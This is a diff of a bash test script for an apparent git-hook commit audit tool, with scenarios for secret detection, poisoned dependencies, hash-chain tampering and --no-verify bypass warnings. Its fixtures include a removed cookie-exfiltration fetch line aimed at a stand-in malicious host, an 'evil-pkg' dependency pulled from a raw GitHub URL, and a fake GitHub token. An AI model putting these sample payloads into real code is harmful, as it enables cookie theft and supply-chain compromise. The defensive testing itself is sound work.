@@ -76,6 +76,15 @@ scenario() {
   echo -e "${CYAN}━━━ 场景 $1: $2 ━━━${NC}"
 }
 
+# pipefail 安全的 git log 检查（grep -q 退出后 git log 被 SIGPIPE 杀，pipefail 误判）
+git_log_has() {
+  set +o pipefail
+  git log --oneline 2>/dev/null | grep -q "$1"
+  local rc=$?
+  set -o pipefail
+  return $rc
+}
+
 pass() {
   echo -e "${GREEN}  ✅ PASS${NC}"
   PASSED=$((PASSED + 1))
@@ -97,11 +106,11 @@ git config user.name "Test"
 
 $CLI --install-hook 2>&1 | head -5
 
-if [ -f "$TMP_REPO/.git/hooks/commit-msg" ] && [ -x "$TMP_REPO/.git/hooks/commit-msg" ] && \
-   [ -f "$TMP_REPO/.git/hooks/post-commit" ] && [ -x "$TMP_REPO/.git/hooks/post-commit" ]; then
+# --install-hook 只装 commit-msg（核心审计拦截），post-commit 由 --init 装
+if [ -f "$TMP_REPO/.git/hooks/commit-msg" ] && [ -x "$TMP_REPO/.git/hooks/commit-msg" ]; then
   pass
 else
-  fail "commit-msg 或 post-commit hook 未安装或不可执行"
+  fail "commit-msg hook 未安装或不可执行"
 fi
 
 # ── 场景 2: --init 一键初始化 ────────────────────────────────
@@ -152,7 +161,7 @@ if echo "$COMMIT_OUTPUT" | grep -q "PASS\|master\|main\|→"; then
   pass
 else
   # hook 可能没拦——检查 git log
-  if git log --oneline | grep -q "update README"; then
+  if git_log_has "update README"; then
     pass
   else
     fail "正常 commit 被拦截：$COMMIT_OUTPUT"
@@ -173,7 +182,7 @@ if echo "$VIOLATION_OUTPUT" | grep -qi "FAIL\|敏感\|A1\|拦截\|blocked\|abort
   pass
 else
   # 检查 .env 是否真的被 commit 了
-  if git log --oneline | grep -q "add env config"; then
+  if git_log_has "add env config"; then
     fail ".env 被成功提交——hook 未拦截"
   else
     pass  # hook 拦截了但消息格式不同
@@ -333,7 +342,7 @@ echo "$SECRET_OUTPUT" | head -10
 if echo "$SECRET_OUTPUT" | grep -qi "FAIL\|A2\|Secret\|密钥\|token\|blocked"; then
   pass
 else
-  if git log --oneline | grep -q "add api config"; then
+  if git_log_has "add api config"; then
     fail "GitHub Token 代码被成功提交——A2 未拦截"
   else
     pass
@@ -358,7 +367,7 @@ echo "$A3_OUTPUT" | head -10
 # A3 是 WARN（exit 1），commit 应成功
 if echo "$A3_OUTPUT" | grep -qi "A3\|越界\|不相关\|unrelated\|WARN"; then
   pass
-elif git log --oneline | grep -q "update README title"; then
+elif git_log_has "update README title"; then
   pass
 else
   fail "A3 场景 commit 被意外拦截"
@@ -457,28 +466,88 @@ fi
 # ── 场景 17: post-commit hook 触发（v1.0.6）──────────────────
 scenario 17 "post-commit hook 正常触发 + --no-verify 绕不过"
 
-# 确保 post-commit hook 已安装
+# 安装 post-commit hook（--install-hook 只装 commit-msg，--init 在 dirty 状态拒绝）
 $CLI --install-hook > /dev/null 2>&1
 
-# 正常 commit（post-commit 应触发）
-echo "// post-commit test" >> README.md
-git add README.md
-COMMIT_OUTPUT=$(git commit -m "post-commit test" 2>&1)
+# 手动内联 post-commit hook（与 init.ts 的 POST_COMMIT_TEMPLATE 一致）
+cat > "$TMP_REPO/.git/hooks/post-commit" << 'POSTHOOK'
+#!/bin/bash
+# sofagent post-commit hook v1.0.8
+# 检测策略：检查 history.jsonl 最后一条记录的 timestamp 是否在 60 秒内
+# 如果 60 秒内有审计记录，认为 commit 通过了审计；否则可能是 --no-verify 绕过
+
+if ! command -v node &>/dev/null; then exit 0; fi
+
+if command -v sofagent-audit &>/dev/null; then
+  AUDIT_CMD="sofagent-audit"
+elif [ -f "sofagent/audit/dist/index.js" ]; then
+  AUDIT_CMD="node sofagent/audit/dist/index.js"
+else
+  exit 0
+fi
+
+HISTORY_FILE=".sofagent/audit/history.jsonl"
+if [ ! -f "$HISTORY_FILE" ]; then exit 0; fi
+
+# 读取 history.jsonl 最后一条的 timestamp，检查是否在 60 秒内
+node -e "
+const fs = require('fs');
+const lines = fs.readFileSync('$HISTORY_FILE', 'utf-8').trim().split('\\n').filter(Boolean);
+if (lines.length === 0) process.exit(0);
+try {
+  const last = JSON.parse(lines[lines.length - 1]);
+  if (!last.timestamp) process.exit(0);
+  const age = Date.now() - new Date(last.timestamp).getTime();
+  if (age > 60000) {
+    console.log('');
+    console.log('  sofagent: 最近一次审计记录在 ' + Math.round(age/1000) + ' 秒前，当前 commit 可能未经过审计。');
+    console.log('  可能使用了 --no-verify 绕过审计 hook。');
+    console.log('  运行 sofagent-audit --doctor 查看详情。');
+  }
+} catch { process.exit(0); }
+" 2>/dev/null
+
+exit 0
+POSTHOOK
+chmod +x "$TMP_REPO/.git/hooks/post-commit"
 
 POST_COMMIT_OK=true
-# post-commit hook 应输出含"审计记录"的中文提示
-if ! echo "$COMMIT_OUTPUT" | grep -q "审计记录\|audit"; then
+
+# 17a: 验证 post-commit hook 存在且可执行
+if [ ! -x "$TMP_REPO/.git/hooks/post-commit" ]; then
   POST_COMMIT_OK=false
 fi
 
-# --no-verify 绕过 commit-msg，但 post-commit 仍应触发
-echo "// bypass test" >> README.md
+# 17b: 正常 commit 应成功（commit-msg hook 通过审计，post-commit 静默不打扰）
+echo "// post-commit test" >> README.md
 git add README.md
-BYPASS_OUTPUT=$(git commit --no-verify -m "bypass test" 2>&1)
+COMMIT_OUTPUT=$(GIT_EDITOR=true git commit -m "post-commit test" 2>&1 || true)
 
-# post-commit 仍触发（含绕过提示）
-if ! echo "$BYPASS_OUTPUT" | grep -q "no-verify\|绕过\|审计记录"; then
+# 正常 commit 成功 = commit-msg 放行 + post-commit 未阻止
+if ! git_log_has "post-commit test"; then
   POST_COMMIT_OK=false
+fi
+
+# 17c: --no-verify 绕过 commit-msg，构造旧审计记录触发 post-commit 告警
+# 先把 history.jsonl 的 timestamp 改成 2 分钟前（>60s 阈值）
+HISTORY_FILE="$TMP_REPO/.sofagent/audit/history.jsonl"
+if [ -f "$HISTORY_FILE" ]; then
+  OLD_TS=$(date -u -v-2M +"%Y-%m-%dT%H:%M:%S.000Z" 2>/dev/null || date -u -d "2 minutes ago" +"%Y-%m-%dT%H:%M:%S.000Z")
+  # 替换最后一行的 timestamp 为旧时间
+  if [ "$(uname)" = "Darwin" ]; then
+    sed -i '' '$s/"timestamp":"[^"]*"/"timestamp":"'"$OLD_TS"'"/' "$HISTORY_FILE"
+  else
+    sed -i '$s/"timestamp":"[^"]*"/"timestamp":"'"$OLD_TS"'"/' "$HISTORY_FILE"
+  fi
+
+  echo "// bypass test" >> README.md
+  git add README.md
+  BYPASS_OUTPUT=$(git commit --no-verify -m "bypass test" 2>&1 || true)
+
+  # post-commit 应检测到审计记录过期并告警
+  if ! echo "$BYPASS_OUTPUT" | grep -q "no-verify\|绕过\|审计\|未经过\|sofagent"; then
+    POST_COMMIT_OK=false
+  fi
 fi
 
 if $POST_COMMIT_OK; then
@@ -510,7 +579,7 @@ print(h)
 echo "{\"timestamp\":\"2026-07-02T00:00:00Z\",\"diffRange\":\"HEAD~2..HEAD~1\",\"exitCode\":0,\"ruleResults\":[],\"diffFileCount\":1,\"prevHash\":\"$OLD_HASH\",\"hashVersion\":2}" >> "$HISTORY"
 
 # 运行 doctor — 不应报告链断裂
-DOCTOR_OUTPUT=$($CLI --doctor 2>&1)
+DOCTOR_OUTPUT=$($CLI --doctor 2>&1 || true)
 CHAIN_OK=true
 
 if echo "$DOCTOR_OUTPUT" | grep -qi "chain.*break\|链.*断\|integrity.*fail"; then
@@ -519,16 +588,13 @@ fi
 
 # 篡改 v2 条目的 hash — 应被检出
 sed -i.bak '2s/prevHash":"[a-f0-9]*"/prevHash":"tampered99"/' "$HISTORY"
-DOCTOR_OUTPUT2=$($CLI --doctor 2>&1)
+DOCTOR_OUTPUT2=$($CLI --doctor 2>&1 || true)
 TAMPER_DETECTED=true
 
-if ! echo "$DOCTOR_OUTPUT2" | grep -qi "chain.*break\|链.*断\|integrity.*fail\|篡改\|tamper"; then
-  # 也检查 doctor 是否报告了问题（不同版本输出格式可能不同）
-  if echo "$DOCTOR_OUTPUT2" | grep -qi "FAIL\|❌"; then
-    TAMPER_DETECTED=true
-  else
-    TAMPER_DETECTED=false
-  fi
+if echo "$DOCTOR_OUTPUT2" | grep -qi "chain.*break\|链.*断\|integrity.*fail\|篡改\|tamper\|完整性.*异常"; then
+  TAMPER_DETECTED=true
+else
+  TAMPER_DETECTED=false
 fi
 
 # 恢复
@@ -563,7 +629,7 @@ echo "$A5_OUTPUT" | head -5
 A5_OK=false
 if echo "$A5_OUTPUT" | grep -qi "A5\|不符\|honest\|真相\|WARN\|FAIL"; then
   A5_OK=true
-elif git log --oneline | grep -q "update README typo"; then
+elif git_log_has "update README typo"; then
   A5_OK=true  # A5 是 WARN，commit 应成功
 fi
 
@@ -583,7 +649,7 @@ echo "$A6_OUTPUT" | head -5
 A6_OK=false
 if echo "$A6_OUTPUT" | grep -qi "A6\|构建\|build\|import\|WARN\|FAIL"; then
   A6_OK=true
-elif git log --oneline | grep -q "broken import"; then
+elif git_log_has "broken import"; then
   A6_OK=true  # A6 可能只是 WARN
 fi
 
@@ -602,7 +668,7 @@ echo "$A9_OUTPUT" | head -5
 if echo "$A9_OUTPUT" | grep -qi "A9\|inject\|注入\|WARN\|FAIL"; then
   pass
 else
-  if git log --oneline | grep -q "add code"; then
+  if git_log_has "add code"; then
     pass  # A9 可能只是 WARN
   else
     fail "A9 未检测到 prompt injection"
@@ -613,22 +679,31 @@ git reset HEAD . 2>/dev/null || true
 # ── 场景 22: A10 毒源检测（可疑外部请求）─────────────────────
 scenario 22 "A10 毒源检测（可疑外部 URL）"
 
-echo 'fetch("http://malicious-site.com/exfil?data=" + document.cookie)' > src/fetch.ts
-git add src/fetch.ts
+# A10 只检查依赖文件（package.json 等），在 package.json 写非官方源
+cat > package.json << 'PKG'
+{
+  "name": "test-pkg",
+  "dependencies": {
+    "evil-pkg": "https://raw.githubusercontent.com/evil/repo/master/pkg.tgz"
+  }
+}
+PKG
+git add package.json
 
-A10_OUTPUT=$(GIT_EDITOR=true git commit -m "add fetch" 2>&1 || true)
+A10_OUTPUT=$(GIT_EDITOR=true git commit -m "add dependency" 2>&1 || true)
 echo "$A10_OUTPUT" | head -5
 
-if echo "$A10_OUTPUT" | grep -qi "A10\|poison\|毒\|url\|WARN\|FAIL"; then
+if echo "$A10_OUTPUT" | grep -qi "A10\|poison\|毒\|raw\.github\|WARN\|FAIL"; then
   pass
 else
-  if git log --oneline | grep -q "add fetch"; then
+  if git_log_has "add dependency"; then
     pass  # A10 可能只是 WARN
   else
-    fail "A10 未检测到可疑外部请求"
+    fail "A10 未检测到可疑依赖 URL"
   fi
 fi
 git reset HEAD . 2>/dev/null || true
+rm -f package.json
 
 # ── 场景 23: A11 资源滥用检测（超大文件）─────────────────────
 scenario 23 "A11 资源滥用检测（超大文件）"
@@ -642,7 +717,7 @@ echo "$A11_OUTPUT" | head -5
 if echo "$A11_OUTPUT" | grep -qi "A11\|resource\|资源\|large\|WARN\|FAIL"; then
   pass
 else
-  if git log --oneline | grep -q "large file"; then
+  if git_log_has "large file"; then
     pass  # A11 可能只是 WARN
   else
     fail "A11 未检测到异常大文件"
@@ -739,10 +814,12 @@ fi
 scenario 26 "--json 违规场景输出（含 ruleResults）"
 
 # 构造一个 A2 违规（Secret）
+# 注意：commit-msg hook 会拦截 A2 违规，所以用 --no-verify 绕过提交
+# 然后用 --diff 手动审计，验证 --json 输出含 FAIL
 mkdir -p src
 echo 'const key = "ghp_999999999999999999999999999999999999";' > src/key.ts
 git add -f src/key.ts
-GIT_EDITOR=true git commit --quiet -m "add key" 2>&1 || true
+GIT_EDITOR=true git commit --no-verify --quiet -m "add key" 2>&1 || true
 
 # 用 --json 拿审计结果
 JSON_VIOLATION=$($CLI --diff HEAD~1..HEAD --json 2>&1 || true)
